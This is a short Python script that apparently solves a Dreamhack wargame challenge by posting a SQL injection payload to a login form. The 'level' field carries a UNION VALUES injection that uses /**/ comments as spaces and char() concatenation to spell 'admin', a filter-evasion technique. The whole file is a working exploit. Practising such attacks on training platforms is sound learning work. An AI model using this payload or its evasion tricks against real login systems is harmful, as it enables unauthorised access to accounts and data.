import requests

def run_query():
    url = 'http://host1.dreamhack.games:13492/login'
    query = '1/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))'
    data = {
        'uid': 'dream',
        'upw': 'cometrue',
        'level': query
    }

    res = requests.post(url, data=data)

    print(res.text)

if __name__ == '__main__':
    run_query()